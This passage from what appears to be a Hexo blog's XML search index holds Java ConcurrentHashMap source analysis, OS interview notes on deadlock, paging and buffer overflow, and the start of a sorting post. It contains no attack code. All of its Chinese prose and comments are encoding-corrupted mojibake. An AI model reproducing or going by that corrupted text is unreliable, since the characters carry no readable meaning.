æ‰€æœ‰çš„è¿ç§»æ“ä½œå·²ç»å®Œæˆ</span></span><br><span class="line">                nextTable = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// å°†æ–°çš„ nextTab èµ‹å€¼ç»™ table å±æ€§ï¼Œå®Œæˆè¿ç§»</span></span><br><span class="line">                table = nextTab;</span><br><span class="line">                <span class="comment">// é‡æ–°è®¡ç®— sizeCtlï¼šn æ˜¯åŸæ•°ç»„é•¿åº¦ï¼Œæ‰€ä»¥ sizeCtl å¾—å‡ºçš„å€¼å°†æ˜¯æ–°æ•°ç»„é•¿åº¦çš„ 0.75 å€</span></span><br><span class="line">                sizeCtl = (n &lt;&lt; <span class="number">1</span>) - (n &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// ä¹‹å‰æˆ‘ä»¬è¯´è¿‡ï¼ŒsizeCtl åœ¨è¿ç§»å‰ä¼šè®¾ç½®ä¸º (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2</span></span><br><span class="line">            <span class="comment">// ç„¶åï¼Œæ¯æœ‰ä¸€ä¸ªçº¿ç¨‹å‚ä¸è¿ç§»å°±ä¼šå°† sizeCtl åŠ  1ï¼Œ</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œä½¿ç”¨ CAS æ“ä½œå¯¹ sizeCtl è¿›è¡Œå‡ 1ï¼Œä»£è¡¨åšå®Œäº†å±äºè‡ªå·±çš„ä»»åŠ¡</span></span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc = sizeCtl, sc - <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="comment">// ä»»åŠ¡ç»“æŸï¼Œæ–¹æ³•é€€å‡º</span></span><br><span class="line">                <span class="keyword">if</span> ((sc - <span class="number">2</span>) != resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFT)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// åˆ°è¿™é‡Œï¼Œè¯´æ˜ (sc - 2) == resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFTï¼Œ</span></span><br><span class="line">                <span class="comment">// ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰çš„è¿ç§»ä»»åŠ¡éƒ½åšå®Œäº†ï¼Œä¹Ÿå°±ä¼šè¿›å…¥åˆ°ä¸Šé¢çš„ if(finishing)&#123;&#125; åˆ†æ”¯äº†</span></span><br><span class="line">                finishing = advance = <span class="literal">true</span>;</span><br><span class="line">                i = n; <span class="comment">// recheck before commit</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¦‚æœä½ç½® i å¤„æ˜¯ç©ºçš„ï¼Œæ²¡æœ‰ä»»ä½•èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæ”¾å…¥åˆšåˆšåˆå§‹åŒ–çš„ ForwardingNode â€ç©ºèŠ‚ç‚¹â€œ</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i)) == <span class="literal">null</span>)</span><br><span class="line">            advance = casTabAt(tab, i, <span class="literal">null</span>, fwd);</span><br><span class="line">        <span class="comment">// è¯¥ä½ç½®å¤„æ˜¯ä¸€ä¸ª ForwardingNodeï¼Œä»£è¡¨è¯¥ä½ç½®å·²ç»è¿ç§»è¿‡äº†</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">            advance = <span class="literal">true</span>; <span class="comment">// already processed</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å¯¹æ•°ç»„è¯¥ä½ç½®å¤„çš„ç»“ç‚¹åŠ é”ï¼Œå¼€å§‹å¤„ç†æ•°ç»„è¯¥ä½ç½®å¤„çš„è¿ç§»å·¥ä½œ</span></span><br><span class="line">            <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                    Node&lt;K,V&gt; ln, hn;</span><br><span class="line">                    <span class="comment">// å¤´ç»“ç‚¹çš„ hash å¤§äº 0ï¼Œè¯´æ˜æ˜¯é“¾è¡¨çš„ Node èŠ‚ç‚¹</span></span><br><span class="line">                    <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// ä¸‹é¢è¿™ä¸€å—å’Œ Java7 ä¸­çš„ ConcurrentHashMap è¿ç§»æ˜¯å·®ä¸å¤šçš„ï¼Œ</span></span><br><span class="line">                        <span class="comment">// éœ€è¦å°†é“¾è¡¨ä¸€åˆ†ä¸ºäºŒï¼Œ</span></span><br><span class="line">                        <span class="comment">//   æ‰¾åˆ°åŸé“¾è¡¨ä¸­çš„ lastRunï¼Œç„¶å lastRun åŠå…¶ä¹‹åçš„èŠ‚ç‚¹æ˜¯ä¸€èµ·è¿›è¡Œè¿ç§»çš„</span></span><br><span class="line">                        <span class="comment">//   lastRun ä¹‹å‰çš„èŠ‚ç‚¹éœ€è¦è¿›è¡Œå…‹éš†ï¼Œç„¶ååˆ†åˆ°ä¸¤ä¸ªé“¾è¡¨ä¸­</span></span><br><span class="line">                        <span class="type">int</span> <span class="variable">runBit</span> <span class="operator">=</span> fh &amp; n;</span><br><span class="line">                        Node&lt;K,V&gt; lastRun = f;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; p = f.next; p != <span class="literal">null</span>; p = p.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> p.hash &amp; n;</span><br><span class="line">                            <span class="keyword">if</span> (b != runBit) &#123;</span><br><span class="line">                                runBit = b;</span><br><span class="line">                                lastRun = p;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (runBit == <span class="number">0</span>) &#123;</span><br><span class="line">                            ln = lastRun;</span><br><span class="line">                            hn = <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            hn = lastRun;</span><br><span class="line">                            ln = <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; p = f; p != lastRun; p = p.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">ph</span> <span class="operator">=</span> p.hash; <span class="type">K</span> <span class="variable">pk</span> <span class="operator">=</span> p.key; <span class="type">V</span> <span class="variable">pv</span> <span class="operator">=</span> p.val;</span><br><span class="line">                            <span class="keyword">if</span> ((ph &amp; n) == <span class="number">0</span>)</span><br><span class="line">                                ln = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(ph, pk, pv, ln);</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hn = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(ph, pk, pv, hn);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å…¶ä¸­çš„ä¸€ä¸ªé“¾è¡¨æ”¾åœ¨æ–°æ•°ç»„çš„ä½ç½® i</span></span><br><span class="line">                        setTabAt(nextTab, i, ln);</span><br><span class="line">                        <span class="comment">// å¦ä¸€ä¸ªé“¾è¡¨æ”¾åœ¨æ–°æ•°ç»„çš„ä½ç½® i+n</span></span><br><span class="line">                        setTabAt(nextTab, i + n, hn);</span><br><span class="line">                        <span class="comment">// å°†åŸæ•°ç»„è¯¥ä½ç½®å¤„è®¾ç½®ä¸º fwdï¼Œä»£è¡¨è¯¥ä½ç½®å·²ç»å¤„ç†å®Œæ¯•ï¼Œ</span></span><br><span class="line">                        <span class="comment">//    å…¶ä»–çº¿ç¨‹ä¸€æ—¦çœ‹åˆ°è¯¥ä½ç½®çš„ hash å€¼ä¸º MOVEDï¼Œå°±ä¸ä¼šè¿›è¡Œè¿ç§»äº†</span></span><br><span class="line">                        setTabAt(tab, i, fwd);</span><br><span class="line">                        <span class="comment">// advance è®¾ç½®ä¸º trueï¼Œä»£è¡¨è¯¥ä½ç½®å·²ç»è¿ç§»å®Œæ¯•</span></span><br><span class="line">                        advance = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123;</span><br><span class="line">                        <span class="comment">// çº¢é»‘æ ‘çš„è¿ç§»</span></span><br><span class="line">                        TreeBin&lt;K,V&gt; t = (TreeBin&lt;K,V&gt;)f;</span><br><span class="line">                        TreeNode&lt;K,V&gt; lo = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                        TreeNode&lt;K,V&gt; hi = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">lc</span> <span class="operator">=</span> <span class="number">0</span>, hc = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; e = t.first; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> e.hash;</span><br><span class="line">                            TreeNode&lt;K,V&gt; p = <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;K,V&gt;</span><br><span class="line">                                (h, e.key, e.val, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((h &amp; n) == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> ((p.prev = loTail) == <span class="literal">null</span>)</span><br><span class="line">                                    lo = p;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    loTail.next = p;</span><br><span class="line">                                loTail = p;</span><br><span class="line">                                ++lc;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> ((p.prev = hiTail) == <span class="literal">null</span>)</span><br><span class="line">                                    hi = p;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    hiTail.next = p;</span><br><span class="line">                                hiTail = p;</span><br><span class="line">                                ++hc;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å¦‚æœä¸€åˆ†ä¸ºäºŒåï¼ŒèŠ‚ç‚¹æ•°å°‘äº 8ï¼Œé‚£ä¹ˆå°†çº¢é»‘æ ‘è½¬æ¢å›é“¾è¡¨</span></span><br><span class="line">                        ln = (lc &lt;= UNTREEIFY_THRESHOLD) ? untreeify(lo) :</span><br><span class="line">                            (hc != <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(lo) : t;</span><br><span class="line">                        hn = (hc &lt;= UNTREEIFY_THRESHOLD) ? untreeify(hi) :</span><br><span class="line">                            (lc != <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(hi) : t;</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">// å°† ln æ”¾ç½®åœ¨æ–°æ•°ç»„çš„ä½ç½® i</span></span><br><span class="line">                        setTabAt(nextTab, i, ln);</span><br><span class="line">                        <span class="comment">// å°† hn æ”¾ç½®åœ¨æ–°æ•°ç»„çš„ä½ç½® i+n</span></span><br><span class="line">                        setTabAt(nextTab, i + n, hn);</span><br><span class="line">                        <span class="comment">// å°†åŸæ•°ç»„è¯¥ä½ç½®å¤„è®¾ç½®ä¸º fwdï¼Œä»£è¡¨è¯¥ä½ç½®å·²ç»å¤„ç†å®Œæ¯•ï¼Œ</span></span><br><span class="line">                        <span class="comment">//    å…¶ä»–çº¿ç¨‹ä¸€æ—¦çœ‹åˆ°è¯¥ä½ç½®çš„ hash å€¼ä¸º MOVEDï¼Œå°±ä¸ä¼šè¿›è¡Œè¿ç§»äº†</span></span><br><span class="line">                        setTabAt(tab, i, fwd);</span><br><span class="line">                        <span class="comment">// advance è®¾ç½®ä¸º trueï¼Œä»£è¡¨è¯¥ä½ç½®å·²ç»è¿ç§»å®Œæ¯•</span></span><br><span class="line">                        advance = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯´åˆ°åº•ï¼Œtransfer è¿™ä¸ªæ–¹æ³•å¹¶æ²¡æœ‰å®ç°æ‰€æœ‰çš„è¿ç§»ä»»åŠ¡ï¼Œæ¯æ¬¡è°ƒç”¨è¿™ä¸ªæ–¹æ³•åªå®ç°äº† transferIndex å¾€å‰ stride ä¸ªä½ç½®çš„è¿ç§»å·¥ä½œï¼Œå…¶ä»–çš„éœ€è¦ç”±å¤–å›´æ¥æ§åˆ¶ã€‚</p><p>è¿™ä¸ªæ—¶å€™ï¼Œå†å›å»ä»”ç»†çœ‹ tryPresize æ–¹æ³•å¯èƒ½å°±ä¼šæ›´åŠ æ¸…æ™°ä¸€äº›äº†ã€‚</p><h3><span id="get-è¿‡ç¨‹åˆ†æ">get è¿‡ç¨‹åˆ†æ</span></h3><p>get æ–¹æ³•ä»æ¥éƒ½æ˜¯æœ€ç®€å•çš„ï¼Œè¿™é‡Œä¹Ÿä¸ä¾‹å¤–ï¼š</p><ol><li>è®¡ç®— hash å€¼</li><li>æ ¹æ® hash å€¼æ‰¾åˆ°æ•°ç»„å¯¹åº”ä½ç½®: (n - 1) &amp; h</li><li>æ ¹æ®è¯¥ä½ç½®å¤„ç»“ç‚¹æ€§è´¨è¿›è¡Œç›¸åº”æŸ¥æ‰¾<ul><li>å¦‚æœè¯¥ä½ç½®ä¸º nullï¼Œé‚£ä¹ˆç›´æ¥è¿”å› null å°±å¯ä»¥äº†</li><li>å¦‚æœè¯¥ä½ç½®å¤„çš„èŠ‚ç‚¹åˆšå¥½å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œè¿”å›è¯¥èŠ‚ç‚¹çš„å€¼å³å¯</li><li>å¦‚æœè¯¥ä½ç½®èŠ‚ç‚¹çš„ hash å€¼å°äº 0ï¼Œè¯´æ˜æ­£åœ¨æ‰©å®¹ï¼Œæˆ–è€…æ˜¯çº¢é»‘æ ‘ï¼Œåé¢æˆ‘ä»¬å†ä»‹ç» find æ–¹æ³•</li><li>å¦‚æœä»¥ä¸Š 3 æ¡éƒ½ä¸æ»¡è¶³ï¼Œé‚£å°±æ˜¯é“¾è¡¨ï¼Œè¿›è¡Œéå†æ¯”å¯¹å³å¯</li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; <span class="type">int</span> n, eh; K ek;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> spread(key.hashCode());</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="literal">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (e = tabAt(tab, (n - <span class="number">1</span>) &amp; h)) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­å¤´ç»“ç‚¹æ˜¯å¦å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> ((eh = e.hash) == h) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((ek = e.key) == key || (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek)))</span><br><span class="line">                <span class="keyword">return</span> e.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¦‚æœå¤´ç»“ç‚¹çš„ hash å°äº 0ï¼Œè¯´æ˜ æ­£åœ¨æ‰©å®¹ï¼Œæˆ–è€…è¯¥ä½ç½®æ˜¯çº¢é»‘æ ‘</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (eh &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// å‚è€ƒ ForwardingNode.find(int h, Object k) å’Œ TreeBin.find(int h, Object k)</span></span><br><span class="line">            <span class="keyword">return</span> (p = e.find(h, key)) != <span class="literal">null</span> ? p.val : <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// éå†é“¾è¡¨</span></span><br><span class="line">        <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == h &amp;&amp;</span><br><span class="line">                ((ek = e.key) == key || (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek))))</span><br><span class="line">                <span class="keyword">return</span> e.val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•è¯´ä¸€å¥ï¼Œæ­¤æ–¹æ³•çš„å¤§éƒ¨åˆ†å†…å®¹éƒ½å¾ˆç®€å•ï¼Œåªæœ‰æ­£å¥½ç¢°åˆ°æ‰©å®¹çš„æƒ…å†µï¼ŒForwardingNode.find(int h, Object k) ç¨å¾®å¤æ‚ä¸€äº›ï¼Œä¸è¿‡åœ¨äº†è§£äº†æ•°æ®è¿ç§»çš„è¿‡ç¨‹åï¼Œè¿™ä¸ªä¹Ÿå°±ä¸éš¾äº†ï¼Œæ‰€ä»¥é™äºç¯‡å¹…è¿™é‡Œä¹Ÿä¸å±•å¼€è¯´äº†ã€‚</p><h2><span id="æ€»ç»“">æ€»ç»“</span></h2><p>å…¶å®ä¹Ÿä¸æ˜¯å¾ˆéš¾å˜›ï¼Œè™½ç„¶æ²¡æœ‰åƒä¹‹å‰çš„ AQS å’Œçº¿ç¨‹æ± ä¸€æ ·ä¸€è¡Œä¸€è¡Œæºç è¿›è¡Œåˆ†æï¼Œä½†è¿˜æ˜¯æŠŠæ‰€æœ‰åˆå­¦è€…å¯èƒ½ä¼šç³Šæ¶‚çš„åœ°æ–¹éƒ½è¿›è¡Œäº†æ·±å…¥çš„ä»‹ç»ï¼Œåªè¦æ˜¯ç¨å¾®æœ‰ç‚¹åŸºç¡€çš„è¯»è€…ï¼Œåº”è¯¥æ˜¯å¾ˆå®¹æ˜“å°±èƒ½çœ‹æ‡‚ HashMap å’Œ ConcurrentHashMap æºç äº†ã€‚</p><p>çœ‹æºç ä¸ç®—æ˜¯ç›®çš„å§ï¼Œæ·±å…¥åœ°äº†è§£ Doug Lea çš„è®¾è®¡æ€è·¯ï¼Œæˆ‘è§‰å¾—è¿˜æŒºæœ‰è¶£çš„ï¼Œå¤§å¸ˆå°±æ˜¯å¤§å¸ˆï¼Œä»£ç å†™å¾—çœŸçš„æ˜¯å¥½å•Šã€‚</p><p>æˆ‘å‘ç°å¾ˆå¤šäººéƒ½ä»¥ä¸ºæˆ‘å†™åšå®¢ä¸»è¦æ˜¯æºç åˆ†æï¼Œè¯´çœŸçš„ï¼Œæˆ‘å¯¹äºæºç åˆ†ææ²¡æœ‰é‚£ä¹ˆå¤§çƒ­æƒ…ï¼Œä¸»è¦éƒ½æ˜¯ä¸ºäº†ç”¨æºç è¯´äº‹ç½¢äº†ï¼Œå¯èƒ½ä¹‹åçš„æ–‡ç« è¿˜æ˜¯ä¼šæœ‰æ¯”è¾ƒå¤šçš„æºç åˆ†ææˆåˆ†ã€‚</p><p>ä¸è¦è„¸åœ°è‡ªä»¥ä¸ºæœ¬æ–‡çš„è´¨é‡è¿˜æ˜¯æŒºé«˜çš„ï¼Œä¿¡æ¯é‡æ¯”è¾ƒå¤§ï¼Œå¦‚æœä½ è§‰å¾—æœ‰å†™å¾—ä¸å¥½çš„åœ°æ–¹ï¼Œæˆ–è€…è¯´çœ‹å®Œæœ¬æ–‡ä½ è¿˜æ˜¯æ²¡çœ‹æ‡‚å®ƒä»¬ï¼Œé‚£ä¹ˆè¯·æå‡ºæ¥~~~</p><p>ï¼ˆå…¨æ–‡å®Œï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> æºç  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HashMap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ“ä½œç³»ç»Ÿ</title>
      <link href="/2020/04/12/os/"/>
      <url>/2020/04/12/os/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ•´ç†äº†æ“ä½œç³»ç»Ÿçš„å¸¸è€ƒçŸ¥è¯†ç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%AD%BB%E9%94%81%E6%AD%BB%E9%94%81%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6">ä»€ä¹ˆæ˜¯æ­»é”ï¼Ÿæ­»é”äº§ç”Ÿçš„æ¡ä»¶ï¼Ÿ</a></li><li><a href="#%E5%88%86%E9%A1%B5%E5%92%8C%E5%88%86%E6%AE%B5%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">åˆ†é¡µå’Œåˆ†æ®µæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%9C%89%E4%BB%80%E4%B9%88%E5%8D%B1%E5%AE%B3">ä»€ä¹ˆæ˜¯ç¼“å†²åŒºæº¢å‡ºï¼Ÿæœ‰ä»€ä¹ˆå±å®³ï¼Ÿ</a></li></ul><!-- tocstop --><h1><span id="ä»€ä¹ˆæ˜¯æ­»é”æ­»é”äº§ç”Ÿçš„æ¡ä»¶">ä»€ä¹ˆæ˜¯æ­»é”ï¼Ÿæ­»é”äº§ç”Ÿçš„æ¡ä»¶ï¼Ÿ</span></h1><p><strong>ä»€ä¹ˆæ˜¯æ­»é”ï¼š</strong></p><p>ä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹æ— é™æœŸçš„é˜»å¡ã€ç›¸äº’ç­‰å¾…çš„ä¸€ç§çŠ¶æ€ã€‚</p><p><strong>æ­»é”äº§ç”Ÿçš„å››ä¸ªå¿…è¦æ¡ä»¶ï¼š</strong></p><p>ï¼ˆæœ‰ä¸€ä¸ªæ¡ä»¶ä¸æˆç«‹ï¼Œåˆ™ä¸ä¼šäº§ç”Ÿæ­»é”ï¼‰</p><p>1ã€äº’æ–¥æ¡ä»¶ï¼šä¸€ä¸ªèµ„æºä¸€æ¬¡åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨</p><p>2ã€è¯·æ±‚ä¸ä¿æŒæ¡ä»¶ï¼šä¸€ä¸ªè¿›ç¨‹å› è¯·æ±‚èµ„æºè€Œé˜»å¡æ—¶ï¼Œå¯¹å·²è·å¾—èµ„æºä¿æŒä¸æ”¾</p><p>3ã€ä¸å‰¥å¤ºæ¡ä»¶ï¼šè¿›ç¨‹è·å¾—çš„èµ„æºï¼Œåœ¨æœªå®Œå…¨ä½¿ç”¨å®Œä¹‹å‰ï¼Œä¸èƒ½å¼ºè¡Œå‰¥å¤º</p><p>4ã€å¾ªç¯ç­‰å¾…æ¡ä»¶ï¼šè‹¥å¹²è¿›ç¨‹ä¹‹é—´å½¢æˆä¸€ç§å¤´å°¾ç›¸æ¥çš„ç¯å½¢ç­‰å¾…èµ„æºå…³ç³»</p><p><strong>è§£å†³æ­»é”çš„æ–¹æ³•æœ‰ï¼š</strong></p><p>é¢„é˜²æ­»é”ã€é¿å…æ­»é”ã€æ£€æµ‹æ­»é”ã€è§£é™¤æ­»é”</p><p><strong>è§£å†³æ­»é”çš„ç­–ç•¥æœ‰ï¼š</strong></p><p>é¸µé¸Ÿç­–ç•¥ã€é¢„é˜²ç­–ç•¥ã€é¿å…ç­–ç•¥ã€æ£€æµ‹ä¸è§£é™¤æ­»é”</p><h1><span id="åˆ†é¡µå’Œåˆ†æ®µæœ‰ä»€ä¹ˆåŒºåˆ«">åˆ†é¡µå’Œåˆ†æ®µæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</span></h1><p>1ã€æ®µæ˜¯ä¿¡æ¯çš„é€»è¾‘å•ä½ï¼Œå®ƒæ˜¯æ ¹æ®ç”¨æˆ·çš„éœ€è¦åˆ’åˆ†çš„ï¼Œå› æ­¤æ®µå¯¹ç”¨æˆ·æ˜¯å¯è§çš„ ï¼›é¡µæ˜¯ä¿¡æ¯çš„ç‰©ç†å•ä½ï¼Œæ˜¯ä¸ºäº†ç®¡ç†ä¸»å­˜çš„æ–¹ä¾¿è€Œåˆ’åˆ†çš„ï¼Œå¯¹ç”¨æˆ·æ˜¯é€æ˜çš„ã€‚</p><p>2ã€æ®µçš„å¤§å°ä¸å›ºå®šï¼Œæœ‰å®ƒæ‰€å®Œæˆçš„åŠŸèƒ½å†³å®šï¼›é¡µå¤§å¤§å°å›ºå®šï¼Œç”±ç³»ç»Ÿå†³å®š</p><p>3ã€æ®µå‘ç”¨æˆ·æä¾›äºŒç»´åœ°å€ç©ºé—´ï¼›é¡µå‘ç”¨æˆ·æä¾›çš„æ˜¯ä¸€ç»´åœ°å€ç©ºé—´</p><p>4ã€æ®µæ˜¯ä¿¡æ¯çš„é€»è¾‘å•ä½ï¼Œä¾¿äºå­˜å‚¨ä¿æŠ¤å’Œä¿¡æ¯çš„å…±äº«ï¼Œé¡µçš„ä¿æŠ¤å’Œå…±äº«å—åˆ°é™åˆ¶ã€‚</p><h1><span id="ä»€ä¹ˆæ˜¯ç¼“å†²åŒºæº¢å‡ºæœ‰ä»€ä¹ˆå±å®³">ä»€ä¹ˆæ˜¯ç¼“å†²åŒºæº¢å‡ºï¼Ÿæœ‰ä»€ä¹ˆå±å®³ï¼Ÿ</span></h1><p>ç¼“å†²åŒºæº¢å‡ºæ˜¯æŒ‡å½“è®¡ç®—æœºå‘ç¼“å†²åŒºå¡«å……æ•°æ®æ—¶è¶…å‡ºäº†ç¼“å†²åŒºæœ¬èº«çš„å®¹é‡ï¼Œæº¢å‡ºçš„æ•°æ®è¦†ç›–åœ¨åˆæ³•æ•°æ®ä¸Šã€‚</p><p>å±å®³æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><p>ï¼ˆ1ï¼‰ç¨‹åºå´©æºƒï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡</p><p>ï¼ˆ2ï¼‰è·³è½¬å¹¶ä¸”æ‰§è¡Œä¸€æ®µæ¶æ„ä»£ç </p><p>é€ æˆç¼“å†²åŒºæº¢å‡ºçš„ä¸»è¦åŸå› æ˜¯ç¨‹åºä¸­æ²¡æœ‰ä»”ç»†æ£€æŸ¥ç”¨æˆ·è¾“å…¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sorting</title>
      <link href="/2020/04/11/sorting/"/>
      <url>/2020/04/11/sorting/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F">å†’æ³¡æ’åº âˆš</a></li><li><a href="#%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F">æ’å…¥æ’åº âˆš</a></li><li><a href="#%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F-">å¸Œå°”æ’åº -</a></li><li><a href="#%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F-">é€‰æ‹©æ’åº -</a></li><li><a href="#%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F-">å¿«é€Ÿæ’åº -</a><ul><li><a href="#%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9-">å¿«é€Ÿé€‰æ‹© -</a></li></ul></li><li><a href="#%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F-">å½’å¹¶æ’åº -</a></li><li><a href="#%E5%A0%86%E6%8E%92%E5%BA%8F-">å †æ’åº -</a></li><li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li></ul><!-- tocstop --><h1><span id="å†’æ³¡æ’åº">å†’æ³¡æ’åº 